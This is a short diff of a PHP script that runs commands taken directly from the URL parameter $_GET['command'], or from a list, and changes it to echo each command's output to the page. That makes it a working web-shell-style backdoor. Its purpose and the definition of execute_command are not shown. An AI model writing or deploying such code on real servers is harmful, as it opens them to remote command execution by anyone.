@@ -26,11 +26,11 @@
 		foreach ($commands as $command) {
 			echo "<hr> Command: ";
 			echo "<b>".$command."</b><br>";
-			execute_command($command);
+			echo execute_command($command);
 			echo "<br>";
 		}
 	} else {
-		execute_command($_GET["command"]);
+		echo execute_command($_GET["command"]);
 	 }
 
 ?>
